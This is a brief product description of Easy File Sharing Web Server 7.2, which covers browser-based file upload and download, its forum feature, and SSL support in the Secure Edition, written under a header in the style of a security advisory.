######## Description ########

    What is Easy File Sharing Web Server 7.2 ?
    Easy File Sharing Web Server is a file sharing software that allows
visitors to upload/download files easily through a Web Browser. It can help
you share files with your friends and colleagues. They can download files
from your computer or upload files from theirs.They will not be required to
install this software or any other software because an internet browser is
enough. Easy File Sharing Web Server also provides a Bulletin Board System
(Forum). It allows remote users to post messages and files to the forum.
The Secure Edition adds support for SSL encryption that helps protect
businesses against site spoofing and data corruption.
